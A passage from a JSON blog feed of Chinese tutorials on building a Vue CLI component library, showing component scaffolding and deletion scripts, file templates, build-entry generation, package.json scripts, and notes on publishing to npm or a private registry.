 <span>}</span> <span>else</span> <span>{</span>\n    <span>mkdirs</span><span>(</span>path<span>.</span><span>dirname</span><span>(</span>directory<span>)</span><span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n      fs<span>.</span><span>mkdirSync</span><span>(</span>directory<span>)</span><span>;</span>\n      <span>callback</span><span>(</span><span>)</span><span>;</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>delete-comp.js</code></p>\n<div><pre><code><span>// 删除自定义组件脚本</span>\n\n<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>\"chalk\"</span><span>)</span><span>;</span>\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs-extra\"</span><span>)</span><span>;</span>\n<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>\"uppercamelcase\"</span><span>)</span><span>;</span>\n<span>const</span> <span>resolve</span> <span>=</span> <span>(</span><span><span>...</span>file</span><span>)</span> <span>=></span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>...</span>file<span>)</span><span>;</span>\n<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> <span>successLog</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>blue</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> <span>errorLog</span> <span>=</span> <span>(</span><span>error</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>red</span><span>(</span><span><span>`</span><span><span>${</span>error<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n\n<span>log</span><span>(</span><span>\"请输入要删除的组件名称, 形如 demo 或者 demo-test\"</span><span>)</span><span>;</span>\nprocess<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>\"data\"</span><span>,</span> <span>async</span> <span>(</span><span>chunk</span><span>)</span> <span>=></span> <span>{</span>\n  <span>let</span> inputName <span>=</span> <span>String</span><span>(</span>chunk<span>)</span><span>.</span><span>trim</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>\n  inputName <span>=</span> <span>uppercamelize</span><span>(</span>inputName<span>)</span><span>;</span>\n  <span>const</span> componentDirectory <span>=</span> <span>resolve</span><span>(</span><span>\"../packages\"</span><span>,</span> inputName<span>)</span><span>;</span>\n\n  <span>const</span> hasComponentDirectory <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>componentDirectory<span>)</span><span>;</span>\n\n  <span>const</span> docsDirectory <span>=</span> <span>resolve</span><span>(</span><span>\"../docs/component\"</span><span>)</span><span>;</span>\n  <span>const</span> docsMdName <span>=</span> <span>resolve</span><span>(</span>docsDirectory<span>,</span> <span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>.md</span><span>`</span></span><span>)</span><span>;</span>\n  <span>if</span> <span>(</span>inputName<span>)</span> <span>{</span>\n    <span>if</span> <span>(</span>hasComponentDirectory<span>)</span> <span>{</span>\n      <span>log</span><span>(</span><span><span>`</span><span>删除 component 目录 </span><span><span>${</span>componentDirectory<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      <span>await</span> <span>removePromise</span><span>(</span>componentDirectory<span>)</span><span>;</span>\n      <span>successLog</span><span>(</span><span><span>`</span><span>已删除 </span><span><span>${</span>inputName<span>}</span></span><span> 组件目录</span><span>`</span></span><span>)</span><span>;</span>\n\n      <span>log</span><span>(</span><span><span>`</span><span>删除 component 文档 </span><span><span>${</span>docsMdName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n      fs<span>.</span><span>unlink</span><span>(</span>docsMdName<span>)</span><span>;</span>\n      <span>successLog</span><span>(</span><span><span>`</span><span>已删除 </span><span><span>${</span>inputName<span>}</span></span><span> 组件说明文档</span><span>`</span></span><span>)</span><span>;</span>\n    <span>}</span> <span>else</span> <span>{</span>\n      <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>组件目录不存在</span><span>`</span></span><span>)</span><span>;</span>\n      <span>return</span><span>;</span>\n    <span>}</span>\n  <span>}</span> <span>else</span> <span>{</span>\n    <span>errorLog</span><span>(</span><span><span>`</span><span>请重新输入组件名称:</span><span>`</span></span><span>)</span><span>;</span>\n    <span>return</span><span>;</span>\n  <span>}</span>\n\n  process<span>.</span>stdin<span>.</span><span>emit</span><span>(</span><span>\"end\"</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n\nprocess<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>\"end\"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>\n  <span>log</span><span>(</span><span>\"exit\"</span><span>)</span><span>;</span>\n  process<span>.</span><span>exit</span><span>(</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n\n<span>function</span> <span>removePromise</span><span>(</span><span>dir</span><span>)</span> <span>{</span>\n  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>function</span> <span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>{</span>\n    <span>// 先读文件夹</span>\n    fs<span>.</span><span>stat</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> stat</span><span>)</span> <span>{</span>\n      <span>if</span> <span>(</span>stat<span>.</span><span>isDirectory</span><span>(</span><span>)</span><span>)</span> <span>{</span>\n        fs<span>.</span><span>readdir</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> files</span><span>)</span> <span>{</span>\n          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> path<span>.</span><span>join</span><span>(</span>dir<span>,</span> file<span>)</span><span>)</span><span>;</span> <span>// a/b  a/m</span>\n          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> <span>removePromise</span><span>(</span>file<span>)</span><span>)</span><span>;</span> <span>// 这时候变成了promise</span>\n          Promise<span>.</span><span>all</span><span>(</span>files<span>)</span><span>.</span><span>then</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>\n            fs<span>.</span><span>rmdir</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>\n          <span>}</span><span>)</span><span>;</span>\n        <span>}</span><span>)</span><span>;</span>\n      <span>}</span> <span>else</span> <span>{</span>\n        fs<span>.</span><span>unlink</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>\n      <span>}</span>\n    <span>}</span><span>)</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>template.js</code></p>\n<div><pre><code><span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>'uppercamelcase'</span><span>)</span>\n<span>const</span> config <span>=</span> <span>require</span><span>(</span><span>'../config'</span><span>)</span>\n\nmodule<span>.</span>exports <span>=</span> <span>{</span>\n    <span>vueTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>\n        <span>return</span> <span><span>`</span><span>&lt;template>\n  &lt;divtoken interpolation\"><span>${</span>config<span>.</span>prefix<span>}</span></span><span>-</span><span><span>${</span>compoenntName<span>}</span></span><span>\">\n    </span><span><span>${</span>compoenntName<span>}</span></span><span>\n  &lt;/div>\n&lt;/template>\n\n&lt;script>\nexport default {\n  name: '</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>-</span><span><span>${</span>compoenntName<span>}</span></span><span>',\n\n  data () {\n    return {}\n  },\n\n  props: {},\n\n  methods: {}\n}\n&lt;/script>\n\n&lt;style lang=\"scss\">\n  @import './</span><span><span>${</span>compoenntName<span>}</span></span><span>';\n&lt;/style>\n</span><span>`</span></span>\n    <span>}</span><span>,</span>\n    <span>entryTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>\n        <span>return</span> <span><span>`</span><span>import </span><span><span>${</span>compoenntName<span>}</span></span><span> from './</span><span><span>${</span>compoenntName<span>}</span></span><span>'\n\n</span><span><span>${</span>compoenntName<span>}</span></span><span>.install = function (Vue) {\n  Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>}</span></span><span>)\n}\n\nexport default </span><span><span>${</span>compoenntName<span>}</span></span><span>\n\nif (typeof window !== 'undefined' &amp;&amp; window.Vue) {\n  window.Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>}</span></span><span>)\n}\n</span><span>`</span></span>\n    <span>}</span><span>,</span>\n    <span>scssTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>\n        <span>return</span> <span><span>`</span><span>.</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>-</span><span><span>${</span>compoenntName<span>}</span></span><span> {}</span><span>`</span></span>\n    <span>}</span><span>,</span>\n    <span>mdDocs</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>\n        <span>const</span> upperCompoenntName <span>=</span> <span>uppercamelize</span><span>(</span>compoenntName<span>)</span>\n        <span>const</span> upperPrefix <span>=</span> <span>uppercamelize</span><span>(</span>config<span>.</span>prefix<span>)</span>\n\n        <span>return</span> <span><span>`</span><span># </span><span><span>${</span>compoenntName<span>}</span></span><span>\n\n::: tip 提示\n</span><span><span>${</span>compoenntName<span>}</span></span><span>\n:::\n\n## Code Demo\n\n::: demo 基础用法\n\n\\ </span><span>`</span></span>\\<span><span>`</span><span> \\` vue\n&lt;</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>-</span><span><span>${</span>compoenntName<span>}</span></span><span>>&lt;/</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>-</span><span><span>${</span>compoenntName<span>}</span></span><span>>\n\\ </span><span>`</span></span>\\<span><span>`</span><span> \\`\n:::\n\n## Used\n\n### 按需引入\n\n\\ </span><span>`</span></span>\\<span><span>`</span><span> \\`javascript\nimport Vue from 'vue'\nimport {\n  </span><span><span>${</span>upperPrefix<span>}</span></span><span><span>${</span>upperCompoenntName<span>}</span></span><span>\n} from '</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>'\n\nVue.use(</span><span><span>${</span>upperPrefix<span>}</span></span><span><span>${</span>upperCompoenntName<span>}</span></span><span>)\n\\ </span><span>`</span></span>\\<span><span>`</span><span> \\`\n\n### 局部引入\n\n\\ </span><span>`</span></span>\\<span><span>`</span><span> \\` javascript\nimport {\n  </span><span><span>${</span>upperPrefix<span>}</span></span><span><span>${</span>upperCompoenntName<span>}</span></span><span>\n} from '</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>'\n\nexport default {\n  components: {\n    </span><span><span>${</span>upperPrefix<span>}</span></span><span><span>${</span>upperCompoenntName<span>}</span></span><span>\n  }\n}\n\\ </span><span>`</span></span>\\<span><span>`</span><span> \\`\n\n## API\n\n### Props\n\n| 参数 | 说明 | 类型 | 可选值 | 默认值 | 版本 |\n| ---- | ---- | ---- | ------ | ------ | ---- |\n| -    | -    | -    | -      | -      | -    |\n\n### Events\n\n| 事件名 | 说明 | 回调参数 |\n| ------ | ---- | -------- |\n| -      | -    | -        |\n\n</span><span>`</span></span>\n    <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在 <code>build</code> 中创建以下几个文件, 其中 <code>build-entry.js</code> 脚本是用来生成自定义组件导出 <code>packages/index.js</code> , <code>get-components.js</code> 脚本是用来获取 <code>packages</code> 目录下的所有组件</p>\n<div><pre><code>|-- build-entry.js\n|\n|-- get-components.js\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>相关的代码如下, 小主可以根据自己的需求进行相应的简单修改, 下面的代码参考来源 <a href=\"https://github.com/Eamonnzhang/vue-cards\" target=\"_blank\" rel=\"noopener noreferrer\">vue-cards</a></p>\n<p><code>build-entry.js</code></p>\n<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs-extra\"</span><span>)</span><span>;</span>\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>\"chalk\"</span><span>)</span><span>;</span>\n<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>\"uppercamelcase\"</span><span>)</span><span>;</span>\n<span>const</span> Components <span>=</span> <span>require</span><span>(</span><span>\"./get-components\"</span><span>)</span><span>(</span><span>)</span><span>;</span>\n<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>\n<span>const</span> config <span>=</span> <span>require</span><span>(</span><span>\"../config\"</span><span>)</span><span>;</span>\n\n<span>function</span> <span>buildPackagesEntry</span><span>(</span><span>)</span> <span>{</span>\n  <span>const</span> uninstallComponents <span>=</span> <span>[</span><span>]</span><span>;</span>\n\n  <span>const</span> importList <span>=</span> Components<span>.</span><span>map</span><span>(</span>\n    <span>(</span><span>name</span><span>)</span> <span>=></span> <span><span>`</span><span>import </span><span><span>${</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>}</span></span><span> from './</span><span><span>${</span>name<span>}</span></span><span>'</span><span>`</span></span>\n  <span>)</span><span>;</span>\n  <span>const</span> exportList <span>=</span> Components<span>.</span><span>map</span><span>(</span><span>(</span><span>name</span><span>)</span> <span>=></span> <span><span>`</span><span><span>${</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>}</span></span><span>`</span></span><span>)</span><span>;</span>\n  <span>const</span> intallList <span>=</span> exportList<span>.</span><span>filter</span><span>(</span>\n    <span>(</span><span>name</span><span>)</span> <span>=></span> <span>!</span><span>~</span>uninstallComponents<span>.</span><span>indexOf</span><span>(</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>)</span>\n  <span>)</span><span>;</span>\n  <span>const</span> content <span>=</span> <span><span>`</span><span>import './assets/common.scss'\nimport './utils/filters'\n\n</span><span><span>${</span>importList<span>.</span><span>join</span><span>(</span><span>\"\\n\"</span><span>)</span><span>}</span></span><span>\n\nconst version = require('../package.json').version\nconst components = [\n  </span><span><span>${</span>intallList<span>.</span><span>join</span><span>(</span><span>\",\\n  \"</span><span>)</span><span>}</span></span><span>\n]\n\nconst install = Vue => {\n  if (install.installed) return\n  components.map(component => Vue.component(component.name, component))\n}\n\nexport {\n  install,\n  version,\n  </span><span><span>${</span>exportList<span>.</span><span>join</span><span>(</span><span>\",\\n  \"</span><span>)</span><span>}</span></span><span>\n}\n\nexport default {\n  install,\n  version\n}\n</span><span>`</span></span><span>;</span>\n\n  fs<span>.</span><span>writeFileSync</span><span>(</span>path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>\"../packages/index.js\"</span><span>)</span><span>,</span> content<span>)</span><span>;</span>\n  <span>log</span><span>(</span><span>\"packages/index.js 文件已更新依赖\"</span><span>)</span><span>;</span>\n  <span>log</span><span>(</span><span>\"exit\"</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>function</span> <span>setDocsConfig</span><span>(</span><span>)</span> <span>{</span>\n  <span>const</span> docsURL <span>=</span> <span>[</span><span>]</span><span>;</span>\n  Components<span>.</span><span>forEach</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>{</span>\n    docsURL<span>.</span><span>push</span><span>(</span><span><span>`</span><span>'/component/</span><span><span>${</span>item<span>}</span></span><span>'</span><span>`</span></span><span>)</span><span>;</span>\n  <span>}</span><span>)</span><span>;</span>\n  <span>const</span> content <span>=</span> <span><span>`</span><span>const config = {\n  dest: 'public',\n  plugins: ['vue-demo'],\n  serviceWorker: true,\n  themeConfig: {\n    sidebar: [\n      ['/CHANGELOG', '更新日志'],\n      ['/', '指南'], \n      {\n        title: '组件',\n        collapsable: false,\n        children: [\n          </span><span><span>${</span>docsURL<span>.</span><span>join</span><span>(</span><span>\",\\n          \"</span><span>)</span><span>}</span></span><span>\n        ]\n      }\n    ]\n  },\n  markdown: {\n    lineNumbers: true\n  },\n  title: '</span><span><span>${</span>config<span>.</span>docsTitle<span>}</span></span><span>',\n  base: '</span><span><span>${</span>config<span>.</span>base<span>}</span></span><span>'\n}\n\nmodule.exports = config\n</span><span>`</span></span><span>;</span>\n\n  fs<span>.</span><span>writeFileSync</span><span>(</span>\n    path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>\"../docs/.vuepress/config.js\"</span><span>)</span><span>,</span>\n    content\n  <span>)</span><span>;</span>\n  <span>log</span><span>(</span><span>\"packages/index.js 文件已更新依赖\"</span><span>)</span><span>;</span>\n  <span>log</span><span>(</span><span>\"exit\"</span><span>)</span><span>;</span>\n<span>}</span>\n\n<span>buildPackagesEntry</span><span>(</span><span>)</span><span>;</span>\n<span>setDocsConfig</span><span>(</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>get-components.js</code></p>\n<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>\"fs\"</span><span>)</span><span>;</span>\n<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>\"path\"</span><span>)</span><span>;</span>\n\n<span>const</span> excludes <span>=</span> <span>[</span>\n  <span>\"index.js\"</span><span>,</span>\n  <span>\"theme-chalk\"</span><span>,</span>\n  <span>\"mixins\"</span><span>,</span>\n  <span>\"utils\"</span><span>,</span>\n  <span>\".DS_Store\"</span><span>,</span>\n  <span>\"assets\"</span><span>,</span>\n<span>]</span><span>;</span>\n\nmodule<span>.</span><span>exports</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n  <span>const</span> dirs <span>=</span> fs<span>.</span><span>readdirSync</span><span>(</span>path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>\"../packages\"</span><span>)</span><span>)</span><span>;</span>\n  <span>return</span> dirs<span>.</span><span>filter</span><span>(</span><span>(</span><span>dirName</span><span>)</span> <span>=></span> excludes<span>.</span><span>indexOf</span><span>(</span>dirName<span>)</span> <span>===</span> <span>-</span><span>1</span><span>)</span><span>;</span>\n<span>}</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"生成命令\" tabindex=\"-1\"> 生成命令</h3>\n<p>在 <code>package.json</code> 中添加以下内容, 使用命令 <code>yarn new:comp</code> 创建组件目录及其文档或者使用命令 <code>yarn del:comp</code> 即可删除组件目录及其文档</p>\n<div><pre><code><span>{</span>\n  <span>\"scripts\"</span><span>:</span> <span>{</span>\n    <span>\"new:comp\"</span><span>:</span> <span>\"node scripts/create-comp.js &amp;&amp; node build/build-entry.js\"</span><span>,</span>\n    <span>\"del:comp\"</span><span>:</span> <span>\"node scripts/delete-comp.js &amp;&amp; node build/build-entry.js\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h1 id=\"changelog\" tabindex=\"-1\"> changelog</h1>\n<p>在 <code>package.json</code> 中修改 script 字段, 接下来你懂的, 另一篇博客有介绍哦, 小主可以执行搜索</p>\n<div><pre><code><span>{</span>\n  <span>\"scripts\"</span><span>:</span> <span>{</span>\n    <span>\"init\"</span><span>:</span> <span>\"npm install commitizen -g &amp;&amp; commitizen init cz-conventional-changelog --save-dev --save-exact &amp;&amp; npm run bootstrap\"</span><span>,</span>\n    <span>\"bootstrap\"</span><span>:</span> <span>\"npm install\"</span><span>,</span>\n    <span>\"changelog\"</span><span>:</span> <span>\"conventional-changelog -p angular -i docs/CHANGELOG.md -s -r 0\"</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"关于-pages-服务和发布至-npm\" tabindex=\"-1\"> 关于 pages 服务和发布至 npm</h2>\n<h3 id=\"pages-服务\" tabindex=\"-1\"> pages 服务</h3>\n<p>当然组件库以及文档完成之后, 都希望能够有个地址托管我们的组件文档, 这里比较推荐的是使用 <a href=\"https://gitee.com\" target=\"_blank\" rel=\"noopener noreferrer\">Gitee</a> 中的项目 pages 服务</p>\n<h3 id=\"发布至-npm\" tabindex=\"-1\"> 发布至 npm</h3>\n<p>分情况而言</p>\n<p>一是该组件库是公开的, 希望该组件库有较多的社区小伙伴能够一起维护的, 这里就比较推荐使用 <a href=\"https://github.com\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub</a>, 发布命令为 <code>npm publish</code> , 相关的 pages 服务可以参考本博客的托管机制(具体的还需要小主自行研究)</p>\n<p>二是该组件库是是有的, 希望该组件库只是作为多个项目之间的共用 UI 框架, 这里比较推荐的是使用 <a href=\"https://gitee.com\" target=\"_blank\" rel=\"noopener noreferrer\">Gitee</a>, 发布命令为 <code>npm publish</code> , 当然只是这样是不够的, 比较推荐的是使用 npm 私有库来托管我们的组件库(npm 私有库搭建请参考 <a href=\"/archives/693996ef.html\">docker 使用指南-私有 npm 代理注册表</a>, 具体的还需要小主自行研究)</p>\n<p>发布至私有库之前需要详细阅读这两篇文章: <a href=\"/archives/693996ef.html\">docker 使用指南-私有 npm 代理注册表</a>, <a href=\"/archives/9a1dd005.html\">Git 远程推送配置</a></p>\n<h3 id=\"拓展\" tabindex=\"-1\"> 拓展</h3>\n<p>可以定义无需发布的文将和目录</p>\n<p>在项目目录下创建 <code>.npmignore</code></p>\n<div><pre><code>*.js\n.browserslistrc\n.editorconfig\n.npmrc\nbuild/\ndocs/\nscripts/\ntest/\npublic/\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>如果该组件库作为私有库发至私有 npm 代理库中, 建议在组件库项目以及依赖组件库的项目中创建 <code>.npmrc</code> , 注意这里的地址千万千万不能写 <code>127.0.0.1</code> 或者 <code>localhost</code> , 必须写成公网 IP 或者局域网 IP 或者域名, 否则在多人合作模式下则不能正确的发布或者下载</p>\n<div><pre><code>registry=http://192.168.8.10:4873\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "date_published": "2019-08-16T09:30:20.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "vuejs"
      ]
    },
    {
      "title": "使用 Vue cli 3.0 构建自定义组件库(第三弹)",
      "url": "https://vxhly.github.io/views/vuejs/custom-component-library-third.html",
      "id": "https://vxhly.github.io/views/vuejs/custom-component-library-third.html",
      "summary": "前言\n本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等, 此文乃第二弹版本, 看过第一弹版本和第二弹版本的小伙伴, 想必知道前两弹版本的多多少少存在着一些不足之处, 这一弹的版本为第二弹版本的升级版, 这个版本中我们将提供更多方便于操作的内容。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等, 此文乃第二弹版本, 看过第一弹版本和第二弹版本的小伙伴, 想必知道前两弹版本的多多少少存在着一些不足之处, 这一弹的版本为第二弹版本的升级版, 这个版本中我们将提供更多方便于操作的内容。</p>\n</div>\n\n<h2 id=\"前言\" tabindex=\"-1\"> 前言</h2>\n<p><a href=\"/views/vuejs/custom-component-library-first.html\">想看第一弹版本的小伙伴, 请戳我</a>, <a href=\"/views/vuejs/custom-component-library-second.html\">想看第二弹版本的小伙伴, 请戳我</a></p>\n<p>第三弹前期具备知识点</p>\n<ul>\n<li><a href=\"https://vuepress.vuejs.org/zh/\" target=\"_blank\" rel=\"noopener noreferrer\">vuepress</a></li>\n<li><a href=\"https://cli.vuejs.org/zh/\" target=\"_blank\" rel=\"noopener noreferrer\">Vue CLI</a></li>\n<li><a href=\"https://docs.docker.com/docker-hub/\" target=\"_blank\" rel=\"noopener noreferrer\">Docker</a></li>\n</ul>\n<h2 id=\"前置工作\" tabindex=\"-1\"> 前置工作</h2>\n<p>以下工作全部基于 Vue CLI 4.x, 所以首先要保证机子上有 <code>@vue/cli</code></p>\n<div><pre><code>vue create vtp-ui <span># vtp-ui 作为教学的库名</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>dart-sass</code> , <code>babel</code> , <code>eslint</code> 这些是该项目使用的依赖项, 小主可以根据自己的需求进行相应的切换</p>\n<h2 id=\"start\" tabindex=\"-1\"> start</h2>\n<p>开始造轮子了, 以下示例代码 <a href=\"https://github.com/vxhly/vtp-ui\" target=\"_blank\" rel=\"noopener noreferrer\">请戳这里</a></p>\n<h2 id=\"工作目录\" tabindex=\"-1\"> 工作目录</h2>\n<p>默认生成的 src 目录以及 public 目录在该项目下是没有作用的, 小主可以删掉了, 这么做的主要目的当然只是保留生成的 <code>package.json</code> 文件</p>\n<p>调整项目目录如下, 其中 BAT_SCRIPT 文件夹用来存放 windwos 下使用 <code>forever</code> 启动 npm 私有代理的脚本, DOCKER 文件夹用来存放有 <code>docker</code> 环境下启动 npm 私有代理的脚本, docs 文件夹则是 vuepress 的主体部分了, 其中 .vuepress 是用来存放 vuepress 相关的配置文件, 而组件文档则放置在 docs 的根目录, packages 文件夹是用来存放组件的核心代码, vtp-cli 文件夹则是用来存放自定义的组件库中的组件文件以及相应文档生成的 cli 工具</p>\n<p>大致的目录结构如下：</p>\n<div><pre><code>|-- BAT_SCRIPT\n|\n|-- DOCKER\n|\n|-- docs\n    |-- .vuepress\n        |-- config.js\n        |-- enhanceApp.js\n    |-- README.md\n|\n|-- vtp-cli\n|\n|-- packages\n|   |-- index.js\n|\n|-- .npmrm\n|\n|-- .npmignore\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 